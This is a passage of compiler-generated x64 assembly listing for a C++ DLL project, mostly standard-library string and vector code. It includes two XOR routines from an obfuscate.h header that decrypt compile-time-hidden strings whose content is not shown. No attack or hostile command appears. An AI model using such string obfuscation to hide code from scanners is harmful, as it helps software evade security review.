??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT ??1?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??1?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@XZ PROC ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::~_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>, COMDAT
	ret	0
??1?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@XZ ENDP ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::~_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT ??1?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??1?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::~_String_val<std::_Simple_types<wchar_t> >, COMDAT
	ret	0
??1?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::~_String_val<std::_Simple_types<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??0?$allocator@_W@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??0?$allocator@_W@std@@QEAA@XZ PROC			; std::allocator<wchar_t>::allocator<wchar_t>, COMDAT

; 939  :     constexpr allocator() noexcept {}

	mov	rax, rcx
	ret	0
??0?$allocator@_W@std@@QEAA@XZ ENDP			; std::allocator<wchar_t>::allocator<wchar_t>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
;	COMDAT ?end@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA?AV?$_String_iterator@V?$_String_val@U?$_Simple_types@D@std@@@std@@@2@XZ
_TEXT	SEGMENT
this$ = 8
__$ReturnUdt$ = 16
?end@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA?AV?$_String_iterator@V?$_String_val@U?$_Simple_types@D@std@@@std@@@2@XZ PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::end, COMDAT

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [rcx+24], 15

; 2226 :         value_type* _Result = _Bx._Buf;

	mov	r8, rcx

; 2227 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN5@end

; 2228 :             _Result = _Unfancy(_Bx._Ptr);

	mov	r8, QWORD PTR [rcx]
$LN5@end:

; 3967 :         return iterator(

	mov	rcx, QWORD PTR [rcx+16]
	mov	rax, rdx
	add	rcx, r8

; 1851 :     _CONSTEXPR20 _String_const_iterator(pointer _Parg, const _Container_base* _Pstring) noexcept : _Ptr(_Parg) {

	mov	QWORD PTR [rdx], rcx

; 3968 :             _Refancy<pointer>(_Mypair._Myval2._Myptr()) + static_cast<difference_type>(_Mypair._Myval2._Mysize),
; 3969 :             _STD addressof(_Mypair._Myval2));
; 3970 :     }

	ret	0
?end@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA?AV?$_String_iterator@V?$_String_val@U?$_Simple_types@D@std@@@std@@@2@XZ ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::end
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
;	COMDAT ??0?$_String_iterator@V?$_String_val@U?$_Simple_types@D@std@@@std@@@std@@QEAA@PEBDPEBU_Container_base0@1@@Z
_TEXT	SEGMENT
this$ = 8
__param0$ = 16
__param1$dead$ = 24
??0?$_String_iterator@V?$_String_val@U?$_Simple_types@D@std@@@std@@@std@@QEAA@PEBDPEBU_Container_base0@1@@Z PROC ; std::_String_iterator<std::_String_val<std::_Simple_types<char> > >::_String_iterator<std::_String_val<std::_Simple_types<char> > >, COMDAT

; 1851 :     _CONSTEXPR20 _String_const_iterator(pointer _Parg, const _Container_base* _Pstring) noexcept : _Ptr(_Parg) {

	mov	QWORD PTR [rcx], rdx
	mov	rax, rcx
	ret	0
??0?$_String_iterator@V?$_String_val@U?$_Simple_types@D@std@@@std@@@std@@QEAA@PEBDPEBU_Container_base0@1@@Z ENDP ; std::_String_iterator<std::_String_val<std::_Simple_types<char> > >::_String_iterator<std::_String_val<std::_Simple_types<char> > >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
;	COMDAT ?begin@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA?AV?$_String_iterator@V?$_String_val@U?$_Simple_types@D@std@@@std@@@2@XZ
_TEXT	SEGMENT
this$ = 8
__$ReturnUdt$ = 16
?begin@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA?AV?$_String_iterator@V?$_String_val@U?$_Simple_types@D@std@@@std@@@2@XZ PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::begin, COMDAT

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [rcx+24], 15

; 2227 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN17@begin

; 2228 :             _Result = _Unfancy(_Bx._Ptr);

	mov	rax, QWORD PTR [rcx]

; 1851 :     _CONSTEXPR20 _String_const_iterator(pointer _Parg, const _Container_base* _Pstring) noexcept : _Ptr(_Parg) {

	mov	QWORD PTR [rdx], rax

; 3959 :         return iterator(_Refancy<pointer>(_Mypair._Myval2._Myptr()), _STD addressof(_Mypair._Myval2));
; 3960 :     }

	mov	rax, rdx
	ret	0
$LN17@begin:

; 1851 :     _CONSTEXPR20 _String_const_iterator(pointer _Parg, const _Container_base* _Pstring) noexcept : _Ptr(_Parg) {

	mov	QWORD PTR [rdx], rcx

; 3959 :         return iterator(_Refancy<pointer>(_Mypair._Myval2._Myptr()), _STD addressof(_Mypair._Myval2));
; 3960 :     }

	mov	rax, rdx
	ret	0
?begin@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA?AV?$_String_iterator@V?$_String_val@U?$_Simple_types@D@std@@@std@@@2@XZ ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::begin
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ?decrypt@?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@QEAAXXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@QEAAXXZ PROC ; ay::obfuscated_data<17,-3520361701531608807,char>::decrypt, COMDAT

; 147  : 			if ( m_encrypted )

	cmp	BYTE PTR [rcx+17], 0
	mov	r8, rcx
	je	$LN2@decrypt

; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);

	xor	eax, eax
	cmp	DWORD PTR __isa_available, 5
	jl	$LN25@decrypt
	movdqa	xmm2, XMMWORD PTR __xmm@00000000000000010000000000000000
	lea	rdx, QWORD PTR [rcx+4]
	movdqa	xmm3, XMMWORD PTR __xmm@00000000000000070000000000000007
	mov	r9, -2
	movdqa	xmm4, XMMWORD PTR __xmm@cf2529af23519919cf2529af23519919
	sub	r9, rcx
	movdqa	xmm5, XMMWORD PTR __xmm@00000000000008000000000000000800
	mov	r10d, 2
	sub	r10, rcx
$LL7@decrypt:

; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	movzx	ecx, WORD PTR [rdx-4]
	movq	xmm0, rax
	punpcklqdq xmm0, xmm0
	add	rax, 8
	paddq	xmm0, xmm2
	andps	xmm0, xmm3
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm4, xmm0
	movd	xmm0, ecx
	pshufb	xmm1, xmm5
	xorps	xmm1, xmm0
	movd	ecx, xmm1
	mov	WORD PTR [rdx-4], cx
	lea	rcx, QWORD PTR [r9+rdx]
	movq	xmm0, rcx
	movzx	ecx, WORD PTR [rdx-2]
	punpcklqdq xmm0, xmm0
	paddq	xmm0, xmm2
	andps	xmm0, xmm3
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm4, xmm0
	movd	xmm0, ecx
	pshufb	xmm1, xmm5
	xorps	xmm1, xmm0
	movd	ecx, xmm1
	mov	WORD PTR [rdx-2], cx
	mov	rcx, rdx
	sub	rcx, r8
	movq	xmm0, rcx
	movzx	ecx, WORD PTR [rdx]
	punpcklqdq xmm0, xmm0
	paddq	xmm0, xmm2
	andps	xmm0, xmm3
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm4, xmm0
	movd	xmm0, ecx
	pshufb	xmm1, xmm5
	xorps	xmm1, xmm0
	movd	ecx, xmm1
	mov	WORD PTR [rdx], cx
	lea	rcx, QWORD PTR [r10+rdx]
	movq	xmm0, rcx
	movzx	ecx, WORD PTR [rdx+2]
	punpcklqdq xmm0, xmm0
	paddq	xmm0, xmm2
	andps	xmm0, xmm3
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm4, xmm0
	movd	xmm0, ecx
	pshufb	xmm1, xmm5
	xorps	xmm1, xmm0
	movd	ecx, xmm1
	mov	WORD PTR [rdx+2], cx
	add	rdx, 8
	cmp	rax, 16
	jb	$LL7@decrypt

; 68   : 		for ( size_type i = 0; i < size; i++ )

	cmp	rax, 17
	jae	SHORT $LN6@decrypt
$LN25@decrypt:
	mov	r9, -3520361701531608807		; cf2529af23519919H
	npad	7
$LL24@decrypt:

; 69   : 		{
; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	movzx	ecx, al
	mov	rdx, r9
	and	cl, 7
	shl	cl, 3
	shr	rdx, cl
	xor	BYTE PTR [r8+rax], dl
	inc	rax
	cmp	rax, 17
	jb	SHORT $LL24@decrypt
$LN6@decrypt:

; 150  : 				m_encrypted = false;

	mov	BYTE PTR [r8+17], 0
$LN2@decrypt:

; 151  : 			}
; 152  : 		}

	ret	0
?decrypt@?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@QEAAXXZ ENDP ; ay::obfuscated_data<17,-3520361701531608807,char>::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ?data@?$obfuscator@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@QEBAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?data@?$obfuscator@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@QEBAPEBDXZ PROC ; ay::obfuscator<17,-3520361701531608807,char>::data, COMDAT

; 95   : 			return &m_data[0];

	mov	rax, rcx

; 96   : 		}

	ret	0
?data@?$obfuscator@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@QEBAPEBDXZ ENDP ; ay::obfuscator<17,-3520361701531608807,char>::data
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
;	COMDAT ??0?$_String_const_iterator@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@QEAA@PEB_WPEBU_Container_base0@1@@Z
_TEXT	SEGMENT
this$ = 8
_Parg$ = 16
_Pstring$dead$ = 24
??0?$_String_const_iterator@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@QEAA@PEB_WPEBU_Container_base0@1@@Z PROC ; std::_String_const_iterator<std::_String_val<std::_Simple_types<wchar_t> > >::_String_const_iterator<std::_String_val<std::_Simple_types<wchar_t> > >, COMDAT

; 1851 :     _CONSTEXPR20 _String_const_iterator(pointer _Parg, const _Container_base* _Pstring) noexcept : _Ptr(_Parg) {

	mov	QWORD PTR [rcx], rdx

; 1852 :         this->_Adopt(_Pstring);
; 1853 :     }

	mov	rax, rcx
	ret	0
??0?$_String_const_iterator@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@QEAA@PEB_WPEBU_Container_base0@1@@Z ENDP ; std::_String_const_iterator<std::_String_val<std::_Simple_types<wchar_t> > >::_String_const_iterator<std::_String_val<std::_Simple_types<wchar_t> > >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
;	COMDAT ?_Tidy@?$vector@_WV?$allocator@_W@std@@@std@@AEAAXXZ
_TEXT	SEGMENT
this$ = 48
?_Tidy@?$vector@_WV?$allocator@_W@std@@@std@@AEAAXXZ PROC ; std::vector<wchar_t,std::allocator<wchar_t> >::_Tidy, COMDAT

; 2039 :     _CONSTEXPR20 void _Tidy() noexcept { // free all storage

$LN31:
	push	rbx
	sub	rsp, 32					; 00000020H
	mov	rbx, rcx

; 2040 :         auto& _Al         = _Getal();
; 2041 :         auto& _My_data    = _Mypair._Myval2;
; 2042 :         pointer& _Myfirst = _My_data._Myfirst;
; 2043 :         pointer& _Mylast  = _My_data._Mylast;
; 2044 :         pointer& _Myend   = _My_data._Myend;
; 2045 : 
; 2046 :         _My_data._Orphan_all();
; 2047 : 
; 2048 :         if (_Myfirst) { // destroy and deallocate old array

	mov	rcx, QWORD PTR [rcx]
	test	rcx, rcx
	je	SHORT $LN2@Tidy

; 2049 :             _STD _Destroy_range(_Myfirst, _Mylast, _Al);
; 2050 :             _ASAN_VECTOR_REMOVE;
; 2051 :             _Al.deallocate(_Myfirst, static_cast<size_type>(_Myend - _Myfirst));

	mov	rdx, QWORD PTR [rbx+16]
	sub	rdx, rcx
	sar	rdx, 1
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	add	rdx, rdx

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN21@Tidy

; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]
	add	rdx, 39					; 00000027H

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	SHORT $LN18@Tidy

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN21@Tidy:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 2053 :             _Myfirst = nullptr;

	xor	eax, eax
	mov	QWORD PTR [rbx], rax

; 2054 :             _Mylast  = nullptr;

	mov	QWORD PTR [rbx+8], rax

; 2055 :             _Myend   = nullptr;

	mov	QWORD PTR [rbx+16], rax
$LN2@Tidy:

; 2057 :     }

	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
$LN18@Tidy:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN28@Tidy:
?_Tidy@?$vector@_WV?$allocator@_W@std@@@std@@AEAAXXZ ENDP ; std::vector<wchar_t,std::allocator<wchar_t> >::_Tidy
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
;	COMDAT ??0?$_String_const_iterator@V?$_String_val@U?$_Simple_types@D@std@@@std@@@std@@QEAA@PEBDPEBU_Container_base0@1@@Z
_TEXT	SEGMENT
this$ = 8
_Parg$ = 16
_Pstring$dead$ = 24
??0?$_String_const_iterator@V?$_String_val@U?$_Simple_types@D@std@@@std@@@std@@QEAA@PEBDPEBU_Container_base0@1@@Z PROC ; std::_String_const_iterator<std::_String_val<std::_Simple_types<char> > >::_String_const_iterator<std::_String_val<std::_Simple_types<char> > >, COMDAT

; 1851 :     _CONSTEXPR20 _String_const_iterator(pointer _Parg, const _Container_base* _Pstring) noexcept : _Ptr(_Parg) {

	mov	QWORD PTR [rcx], rdx

; 1852 :         this->_Adopt(_Pstring);
; 1853 :     }

	mov	rax, rcx
	ret	0
??0?$_String_const_iterator@V?$_String_val@U?$_Simple_types@D@std@@@std@@@std@@QEAA@PEBDPEBU_Container_base0@1@@Z ENDP ; std::_String_const_iterator<std::_String_val<std::_Simple_types<char> > >::_String_const_iterator<std::_String_val<std::_Simple_types<char> > >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ?decrypt@?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@QEAAXXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@QEAAXXZ PROC ; ay::obfuscated_data<38,-7115718816596162265,char>::decrypt, COMDAT

; 147  : 			if ( m_encrypted )

	cmp	BYTE PTR [rcx+38], 0
	mov	r8, rcx
	je	$LN2@decrypt

; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);

	xor	eax, eax
	cmp	DWORD PTR __isa_available, 5
	jl	$LN25@decrypt
	movdqa	xmm2, XMMWORD PTR __xmm@00000000000000010000000000000000
	lea	rdx, QWORD PTR [rcx+4]
	movdqa	xmm3, XMMWORD PTR __xmm@00000000000000070000000000000007
	mov	r9, -2
	movdqa	xmm4, XMMWORD PTR __xmm@9d3fe36fdf3909279d3fe36fdf390927
	sub	r9, rcx
	movdqa	xmm5, XMMWORD PTR __xmm@00000000000008000000000000000800
	mov	r10d, 2
	sub	r10, rcx
$LL7@decrypt:

; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	movzx	ecx, WORD PTR [rdx-4]
	movq	xmm0, rax
	punpcklqdq xmm0, xmm0
	add	rax, 8
	paddq	xmm0, xmm2
	andps	xmm0, xmm3
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm4, xmm0
	movd	xmm0, ecx
	pshufb	xmm1, xmm5
	xorps	xmm1, xmm0
	movd	ecx, xmm1
	mov	WORD PTR [rdx-4], cx
	lea	rcx, QWORD PTR [r9+rdx]
	movq	xmm0, rcx
	movzx	ecx, WORD PTR [rdx-2]
	punpcklqdq xmm0, xmm0
	paddq	xmm0, xmm2
	andps	xmm0, xmm3
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm4, xmm0
	movd	xmm0, ecx
	pshufb	xmm1, xmm5
	xorps	xmm1, xmm0
	movd	ecx, xmm1
	mov	WORD PTR [rdx-2], cx
	mov	rcx, rdx
	sub	rcx, r8
	movq	xmm0, rcx
	movzx	ecx, WORD PTR [rdx]
	punpcklqdq xmm0, xmm0
	paddq	xmm0, xmm2
	andps	xmm0, xmm3
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm4, xmm0
	movd	xmm0, ecx
	pshufb	xmm1, xmm5
	xorps	xmm1, xmm0
	movd	ecx, xmm1
	mov	WORD PTR [rdx], cx
	lea	rcx, QWORD PTR [r10+rdx]
	movq	xmm0, rcx
	movzx	ecx, WORD PTR [rdx+2]
	punpcklqdq xmm0, xmm0
	paddq	xmm0, xmm2
	andps	xmm0, xmm3
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm4, xmm0
	movd	xmm0, ecx
	pshufb	xmm1, xmm5
	xorps	xmm1, xmm0
	movd	ecx, xmm1
	mov	WORD PTR [rdx+2], cx
	add	rdx, 8
	cmp	rax, 32					; 00000020H
	jb	$LL7@decrypt

; 68   : 		for ( size_type i = 0; i < size; i++ )

	cmp	rax, 38					; 00000026H
	jae	SHORT $LN6@decrypt
$LN25@decrypt:
	mov	r9, -7115718816596162265		; 9d3fe36fdf390927H
	npad	7
$LL24@decrypt:

; 69   : 		{
; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	movzx	ecx, al
	mov	rdx, r9
	and	cl, 7
	shl	cl, 3
	shr	rdx, cl
	xor	BYTE PTR [r8+rax], dl
	inc	rax
	cmp	rax, 38					; 00000026H
	jb	SHORT $LL24@decrypt
$LN6@decrypt:

; 150  : 				m_encrypted = false;

	mov	BYTE PTR [r8+38], 0
$LN2@decrypt:

; 151  : 			}
; 152  : 		}

	ret	0
?decrypt@?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@QEAAXXZ ENDP ; ay::obfuscated_data<38,-7115718816596162265,char>::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ?data@?$obfuscator@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@QEBAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?data@?$obfuscator@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@QEBAPEBDXZ PROC ; ay::obfuscator<38,-7115718816596162265,char>::data, COMDAT

; 95   : 			return &m_data[0];

	mov	rax, rcx

; 96   : 		}

	ret	0
?data@?$obfuscator@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@QEBAPEBDXZ ENDP ; ay::obfuscator<38,-7115718816596162265,char>::data
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
;	COMDAT ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ
_TEXT	SEGMENT
this$ = 8
?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal, COMDAT

; 4892 :         return _Mypair._Get_first();

	mov	rax, rcx

; 4893 :     }

	ret	0
?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
;	COMDAT ?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ
_TEXT	SEGMENT
this$ = 48
?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Tidy_deallocate, COMDAT

; 4865 :     _CONSTEXPR20 void _Tidy_deallocate() noexcept { // initialize buffer, deallocating any storage

$LN38:
	push	rbx
	sub	rsp, 32					; 00000020H

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR [rcx+24]

; 4865 :     _CONSTEXPR20 void _Tidy_deallocate() noexcept { // initialize buffer, deallocating any storage

	mov	rbx, rcx

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	rdx, 7

; 4866 :         auto& _My_data = _Mypair._Myval2;
; 4867 :         _My_data._Orphan_all();
; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN13@Tidy_deall
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR [rcx]
	lea	rdx, QWORD PTR [rdx*2+2]

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN27@Tidy_deall

; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]
	add	rdx, 39					; 00000027H

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	SHORT $LN24@Tidy_deall

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN27@Tidy_deall:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN13@Tidy_deall:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4875 :         _My_data._Mysize = 0;

	xor	eax, eax

; 4876 :         _My_data._Myres  = _Small_string_capacity;

	mov	QWORD PTR [rbx+24], 7
	mov	QWORD PTR [rbx+16], rax

; 4877 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4878 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	WORD PTR [rbx], ax

; 4879 :     }

	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
$LN24@Tidy_deall:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN35@Tidy_deall:
?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Tidy_deallocate
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
;	COMDAT ??1_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??1_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::~_Bxty, COMDAT

; 2285 :         _CONSTEXPR20 ~_Bxty() noexcept {} // user-provided, for fancy pointers

	ret	0
